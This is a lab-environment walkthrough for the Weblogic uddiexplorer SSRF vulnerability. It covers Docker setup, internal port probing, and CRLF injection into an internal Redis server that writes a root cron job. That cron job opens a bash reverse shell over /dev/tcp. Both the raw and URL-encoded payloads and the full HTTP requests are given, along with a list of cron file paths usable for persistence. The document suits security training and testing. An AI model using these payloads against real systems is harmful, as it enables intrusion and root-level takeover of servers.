# Weblogic SSRF Vulnerability

There is an SSRF vulnerability in Weblogic, which can be used to send arbitrary HTTP requests, and then attack vulnerable components such as redis and fastcgi in the internal network.

## Test environment construction

Compile and start the test environment

```
Docker-compose build
Docker-compose up -d
```

Visit `http://your-ip:7001/uddiexplorer/` to view the uddiexplorer app without logging in.

## SSRF Vulnerability Test

The SSRF vulnerability exists in `http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp`, and we tested the vulnerability under brupsuite. Access an accessible IP:PORT, such as `http://127.0.0.1:80`:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:7001 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

The accessible port will get an error, generally returning the status code (as shown below), if the non-http protocol is accessed, it will return `did not have a valid SOAP content-type`.

![](1.png)

Modifying to a non-existing port will return `could not connect over HTTP to server`.

![](2.png)

By detecting the error, the status of the internal network can be detected.

## Inject HTTP headers and use Redis to bounce shells

Weblogic's SSRF has a relatively large feature. Although it is a "GET" request, we can inject newline characters by passing in `%0a%0d`, and some services (such as redis) are separated by newline characters. Each command, that is, we can attack the redis server in the intranet through the SSRF.

First, through ssrf to detect the redis server in the intranet (the network segment of the docker environment is generally 172.*), it is found that `172.18.0.2:6379` can be connected:

![](3.png)

Send three redis commands to write the shell script to `/etc/crontab`:

```
Set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/172.18.0.1/21 0>&1\n\n\n\n"
Config set dir /etc/
Config set dbfilename crontab
Save
```

Perform url encoding:

```
Test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26 %20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set %20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
```

Note that the newline is "\r\n", which is "%0D%0A".

Put the url-encoded string behind the ssrf domain name and send:

```
GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://172.18.0.3:6379/test%0D%0A%0D%0Aset%201%20%22% 5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.18.0.1%2F21%200 %3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


```

![](4.png)

Successful rebound:

![](5.png)


Finally, the cron that can be used has the following places:

 - /etc/crontab This is for sure
 - /etc/cron.d/* Write any file to this directory with the same effect as crontab, and the format should be the same as /etc/crontab. Exploit this directory and you can do it without overwriting any other files.
 - /var/spool/cron/root centos system root user cron file
 - /var/spool/cron/crontabs/root The cron file of the root user under the debian system